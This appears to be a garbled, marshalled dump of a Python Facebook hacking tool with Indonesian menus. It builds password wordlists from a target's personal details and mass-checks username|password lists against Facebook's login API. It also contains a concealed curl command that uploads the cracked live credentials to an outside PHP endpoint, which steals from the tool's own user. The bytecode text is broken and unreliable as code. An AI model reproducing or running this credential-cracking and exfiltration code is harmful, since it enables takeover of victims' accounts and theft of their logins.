   [1;97mâs/   [1;91m[+] [1;92mKetik status [1;91m:[1;97m R]   s   [1;91m[!] Jangan kosongs!   
[1;91m[ [1;97mKembali [1;91m]s7   https://graph.facebook.com/me/feed?method=POST&message=s   &access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s,   [1;91m[+] [1;92mStatus ID[1;91m : [1;97mRP   (   R   R/   R0   RY   R3   R   R   RN   R4   R5   Re   RE   RF   RG   RH   RI   R   (   RO   t   msgt   resRò   (    (    s   <Ahmad_Riswanto>R,  ¡  s.    	


	
c       Ð   C   s4  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nÑXy¤t  j d  t GHd d GHd	 GHd d GHt	 d
  } t | d d  } t	 d  } t	 d  } t	 d  } t	 d  } | d d !} | d d !} | d }	 d d GHd GHt	 d  }
 t	 d  } t	 d  } t
 d  | d d !} | d d !} | d } | j d | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | | |	 | | | |	 | | | | | |	 | | |	 | |	 | |	 |	 |	 | | | | |	 | | | | | |	 | | | | | |	 | | | | | |	 | |
 | | | | |
 | |
 | |
 | | |
 | | | | | |
 | | | | | | | | | | | | | | | | | | | | | | | | | | |
 | |
 | |
 | | | | | | | | | fÎ  d } x5 | d k  r| d } | j | t |  d  qãWd } x5 | d k  rU| d } | j |
 t |  d  q!Wd } x5 | d k  r| d } | j | t |  d  q_Wd } x5 | d k  rÑ| d } | j | t |  d  qW| j   t j d  d | GHt	 d  t   Wn) t k
 r/} d GHt	 d  t   n Xd  S(    NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs1   [1;91m[?] [1;92mIsi data lengkap target dibawahs&   [1;91m[+] [1;92mNama Depan [1;97m: s   .txtR+   s'   [1;91m[+] [1;92mNama Tengah [1;97m: s)   [1;91m[+] [1;92mNama Belakang [1;97m: s*   [1;91m[+] [1;92mNama Panggilan [1;97m: s>   [1;91m[+] [1;92mTanggal Lahir >[1;96mex: |DDMMYY| [1;97m: i    i   i   s)   [1;91m[?] [1;93mKalo Jomblo SKIP aja :vs&   [1;91m[+] [1;92mNama Pacar [1;97m: s0   [1;91m[+] [1;92mNama Panggilan Pacar [1;97m: sD   [1;91m[+] [1;92mTanggal Lahir Pacar >[1;96mex: |DDMMYY| [1;97m: s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...sü  %s%s
%s%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%sid   s   
g      ø?s4   
[1;91m[+] [1;97mTersimpan [1;91m: [1;97m %s.txts!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] Gagal membuat file(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R   R
   R¦   RJ   Re   (   RO   RU   R   R¬   R­   t   dR   R  t   gt   hR¼   t   jt   kt   lt   mRü   t   wgt   ent   wordt   gen(    (    s   <Ahmad_Riswanto>RÉ   ½  sx    		
	

ÿ ÿ }




	

c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd d GHg  } g  } g  } y% t	 d
  } t | d  j
   } Wn' t k
 ré d GHt	 d  t   n Xt	 d  } t d  d d GHx:| D]2} | j   j t |   \ } }	 d | d |	 d }
 t j |
  } t j | j  } d | k r| j |	  d | d |	 GHqd | d k r$| j |	  t d d  } | j d | d |	 d  | j   t  j d t d  t  j d  d | d |	 GHq| j |	  d  | d |	 GHqWd! t t |   d" t t |   d# t t |   GHt	 d  t   d  S($   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs<   [1;91m[?] [1;92mIsi File[1;91m : [1;97musername|passwords'   [1;91m[+] [1;92mFile [1;91m:[1;97m s   [1;91m[!] File tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]s*   [1;91m[+] [1;92mPemisah [1;91m:[1;97m s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R,   s$   [1;97m[[1;92mLive[1;97m]  [1;97ms    | s   www.facebook.comR{   t   configurR+   s   [1;92m[[1;97ms   [1;92m] =>[1;97m s   
s#   curl -X POST -F x=@configur http://s   /ok.phps   rm configurs$   [1;97m[[1;93mCheck[1;97m] [1;97ms$   [1;97m[[1;91mMati[1;97m]  [1;97ms5   
[1;91m[+] [1;97mTotal[1;91m : [1;97mLive=[1;92ms    [1;97mCheck=[1;93ms    [1;97mDie=[1;91m(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R¿   Re   R   R    R   R¦   RE   RF   RG   RH   RI   R   R
   RJ   RL   R¢   (   RO   t   liveR«   t   dieR   t   listt   pemisaht   mekiR¨   R   RR   RS   R©   RW   (    (    s   <Ahmad_Riswanto>R-  ÿ  s^    		

	!
=
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n¯Xt  j d  t GHd d GHt	 d	  d d GHyÕ t
 j d
 |   } t j | j  } xz | d D]n } | d } | d } t d d  } t j |  | j | d  d t |  GHd t |  GHd d GHqÁ Wd t t  GHd GH| j   t d  t   Wn¨ t t f k
 rd GHt d  t   n| t k
 rÅt  j d  d GHt d  t   nI t
 j j k
 rçd GHt   n' t k
 rd GHt d  t   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s2   https://graph.facebook.com/me/groups?access_token=RS   RX   RP   s
   grupid.txtR+   s   
s8   [1;91m[[1;96mâ[1;91m] [1;92mNama  [1;91m:[1;97m s(   [1;91m[+] [1;92mID    [1;91m:[1;97m s   [1;97m=s)   
[1;91m[+] [1;97mJumlah Grup [1;96m%ss6   [1;91m[+] [1;97mTersimpan [1;91m: [1;97mgrupid.txts!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] Terhentis   [1;91m[!] Grup tidak ditemukans   [1;91m[â] Tidak ada koneksis&   [1;91m[!] Kesalahan saat membuat file(   R   R/   R0   RY   R3   R   R   RN   R4   R   RE   RF   RG   RH   RI   t   listgrupR   R
   R¦   R¢   RJ   R5   Re   Ré   Rê   R2   Rë   RM   R   R   (   RO   t   uht   gudRl   R\   RP   R  (    (    s   <Ahmad_Riswanto>R.  5  s\    	
	









c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHHt
 d  }  |  d k r¹ d } t t |  nU |  d k rÛ d } t t |  n3 |  d k rñ t   n |  d k rt   n t   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs   [1;37;40m1. Aktifkans   [1;37;40m2. NonAktifkans   [1;31;40m0. Kembalis   [1;91m-âº[1;97m R   t   trueR^   t   falseR%   R]   (   R   R/   R0   RY   RO   R3   R   R   RN   R4   R5   t   gazRe   R   (   R4  t   aktift   non(    (    s   <Ahmad_Riswanto>R/  h  s6    	

c         C   s3   d |  } t  j |  } t j | j  } | d S(   Ns-   https://graph.facebook.com/me?access_token=%sRP   (   RE   RF   RG   RH   RI   (   RO   RR   R2  t   uid(    (    s   <Ahmad_Riswanto>t
   get_userid  s    
c         C   sù   t  |   } d | t |  f } i d d 6d |  d 6} d } t j | d | d | } | j GHd	 | j k r¦ t j d
  t GHd d GHd GHt d  t	   nO d | j k ré t j d
  t GHd d GHd GHt d  t	   n d GHt
   d  S(   Ns  variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!   application/x-www-form-urlencodeds   Content-Types   OAuth %st   Authorizations"   https://graph.facebook.com/graphqlRS   t   headerss   "is_shielded":trueR   i(   s
   [1;97mâs,   [1;91m[[1;96mâ[1;91m] [1;92mDiaktifkans!   
[1;91m[ [1;97mKembali [1;91m]s   "is_shielded":falses/   [1;91m[[1;96mâ[1;91m] [1;91mDinonaktifkans   [1;91m[!] Error(   RM  R¦   RE   RK   RI   R   R/   R4   R5   Re   R   (   RO   t   enableRP   RS   RO  RR   R2  (    (    s   <Ahmad_Riswanto>RI    s,    	

	

t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(g   R   R   R   t   datetimet   randomRA   R»   R   RG   R6   R   RE   R8   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR7   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R4   R   R¡   R   R£   R¤   R¥   Rè   Rð   Rô   RP   Rö   Rø   Rù   RL   Rý   R  R  R  R  RD  RÒ   RÓ   RN   R1   RZ   Rb   Rc   Rn   Rp   Rq   R   Rr   Rs   R®   Rt   RÀ   Ru   RË   RÌ   RÍ   Rv   Rß   Rá   Râ   Rã   R   Rä   Rå   Ræ   Rd   Rþ   Rÿ   R  R  R   R  R  R  R  R  R  R  Re   R+  R,  RÉ   R-  R.  R/  RM  R:   RI  t   __name__(    (    (    s   <Ahmad_Riswanto>t   <module>   sª   
					?	)		G		 		#	,				E				@	>		"	2	7	<	7	<	8	<		"		&	$		&	'	'	*	*	'	&				B	6	3	$	(   t   marshalt   loads(    (    (    s   <Ahmad_Riswanto>t   <module>   s   (   t   marshalt   loads(    (    (    s   <Ahmad_Riswanto>t   <module>   s   (   t   marshalt   loads(    (    (    s   <Ahmad_Riswanto>t   <module>   s   (   t   marshalt   loads(    (    (    s   com/com-2.pyt   <module>   s   